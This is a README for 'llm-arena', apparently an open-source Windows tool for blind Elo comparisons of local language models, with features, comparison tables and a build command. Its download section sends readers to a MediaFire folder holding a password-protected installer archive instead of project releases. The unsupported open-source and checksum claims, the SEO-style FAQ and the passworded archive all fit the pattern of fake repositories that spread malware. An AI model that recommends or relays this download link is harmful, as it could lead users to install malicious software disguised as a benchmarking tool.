# llm-arena

⚔️ Free, open-source blind Elo arena for local LLMs on Windows — same prompts, hidden names, real win rates. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **True blind mode** — model names hidden until you vote, so branding cannot bias the verdict
- ✅ **Elo ladder** — a running rating table built from your own votes with confidence intervals
- ✅ **Prompt sets** — load a folder of prompts and battle two models across all of them unattended
- ✅ **Speed telemetry** — tokens per second and time to first token recorded per response alongside quality votes
- ✅ **Bracket mode** — eliminate-style tournament across many models with a final standings board
- ✅ **Exportable results** — votes and ratings to CSV and JSON for blog posts or team decisions
- ✅ **100 MB self-contained exe** — runtime and inference backend bundled, portable, offline, MIT

## Why llm-arena

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **llm-arena** | LM Arena web | Open WebUI | SillyTavern |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free web | Free, OSS | Free, OSS |
| Open source | **Yes** | No | Yes | Yes |
| Local GGUF models in arena | **Yes** | No upload | No arena | No arena
| Blind A/B with vote | **Yes** | Yes | No | No |
| Speed telemetry per reply | **Yes** | No | Partial | Partial |
| Portable, no install | **Yes, 100 MB** | Browser | Docker | Node install

## FAQ

**which local LLM is actually better? how to compare models on your own PC**

Leaderboards rank models on other people's hardware and prompts, which rarely matches your GPU and use case. llm-arena runs two of your GGUFs side by side in blind mode and builds an Elo table from your own votes. It is a 100 MB portable exe, MIT, fully offline — rankings never leave the machine.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark arena (#121417, red #F87171): two response panels labeled A and B with names masked, vote buttons beneath, prompt card at top reading round 12.
2. Elo ladder table: eight models ranked with rating, votes and confidence columns, sparkline per model, blue highlight on the current leader.
3. Bracket mode: quarterfinal tree of eight model codenames, two nodes lit as active match, footer chip reading 28 of 50 prompts judged.

## Download

| Source | Link |
|---|---|
| 💾 **Installer llm-arena** | [Installer llm-arena](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).